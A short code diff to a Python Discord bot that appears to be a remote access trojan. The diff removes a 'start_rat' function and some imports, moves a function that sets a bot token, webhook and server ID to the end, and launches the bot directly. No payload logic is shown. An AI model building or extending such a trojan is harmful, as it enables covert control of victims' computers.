@@ -52,19 +52,8 @@ from discord_slash.utils.manage_components import create_button, create_actionro
 
 ## Auto Commands | leave here for now
 # from auto import *
-import pyautogui
-import shutil, os
 from Crypto.Cipher import AES
 from requests import get
-import os
-
-
-def tokns(str1, str2, str3):
-    global token, webhook, g
-    token = str1
-    webhook = str2
-    server_id = str3
-    g = [int(server_id)]
 
 
 '''
@@ -1747,7 +1736,11 @@ async def listProccess_command(ctx: SlashContext):
 
 #endregion
 
-def start_rat():
-    client.run(token)
-
-start_rat()
+def tokns(str1, str2, str3):
+    global token, webhook, g
+    token = str1
+    webhook = str2
+    server_id = str3
+    g = [int(server_id)]
+    
+client.run(token)
